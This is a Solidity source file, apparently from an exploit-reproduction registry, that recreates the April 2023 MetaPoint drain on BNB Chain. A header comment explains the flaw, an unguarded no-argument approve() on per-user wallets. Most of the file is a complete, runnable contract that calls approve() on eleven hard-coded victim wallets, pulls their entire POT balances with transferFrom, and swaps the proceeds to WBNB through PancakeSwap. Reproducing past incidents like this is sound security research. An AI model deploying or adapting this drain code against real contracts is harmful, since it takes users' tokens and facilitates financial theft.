// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-MetaPoint).
// Faithful copy of `ContractTest.testExploit()` from
// evm-hack-registry/2023-04-MetaPoint_exp/test/MetaPoint_exp.sol, with the
// attack moved into a standalone `run()` entrypoint on its own contract
// (the original test runs the whole attack INLINE — `address(this)` is the
// caller of every victim wallet's `approve()` and the recipient of every
// `transferFrom`; there is no separate exploit contract to deploy). No
// imports — minimal interfaces are inlined so this compiles anywhere.
//
// Root cause (unchanged from the original): MetaPoint deployed a per-user
// "wallet" contract for each participant in its mining/pre-sale program.
// Each wallet holds the user's POT tokens and exposes exactly one external
// function, a no-arg `approve()` (selector 0x12424e3f), whose entire body
// is `POT.approve(msg.sender, type(uint256).max)`. There is NO access
// control — the wallet grants an unlimited POT allowance to WHOEVER CALLS
// IT, because the spender is `msg.sender` rather than a hard-coded trusted
// operator. Anyone can call `approve()` on any wallet, then
// `POT.transferFrom(wallet, attacker, balance)` to drain it (the MAX
// allowance never decrements per ERC20 `_spendAllowance`). The final
// PancakeSwap POT->USDT->WBNB swaps are mere liquidation of the loot and
// play no role in the theft itself (BSC, April 2023).

interface IApprove {
    function approve() external;
}

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IPancakeRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract MetaPointDrain {
    address internal constant POT = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IPancakeRouterV2 internal constant ROUTER = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address[11] internal victims = [
        0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,
        0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,
        0xC254741776A13f0C3eFF755a740A4B2aAe14a136,
        0x5923375f1a732FD919D320800eAeCC25910bEdA3,
        0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8,
        0x807d99bfF0bad97e839df3529466BFF09c09E706,
        0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF,
        0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB,
        0xe8d6502E9601D1a5fAa3855de4a25b5b92690623,
        0x435444d086649B846E9C912D21E1Bc651033A623,
        0x52AeD741B5007B4fb66860b5B31dD4c542D65785
    ];

    function run() external {
        // Phase 1 — call approve() on every victim wallet; each grants
        // this contract (msg.sender) an unlimited POT allowance.
        for (uint256 i = 0; i < victims.length; i++) {
            IApprove(victims[i]).approve();
        }

        // Phase 2 — drain each wallet's full POT balance via transferFrom.
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 amount = IERC20Min(POT).balanceOf(victims[i]);
            if (amount == 0) {
                continue;
            }
            IERC20Min(POT).transferFrom(victims[i], address(this), amount);
        }

        // Phase 3 — liquidate the stolen POT: POT -> USDT -> WBNB.
        bscSwap(POT, USDT, IERC20Min(POT).balanceOf(address(this)));
        bscSwap(USDT, WBNB, IERC20Min(USDT).balanceOf(address(this)));
    }

    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20Min(tokenFrom).approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
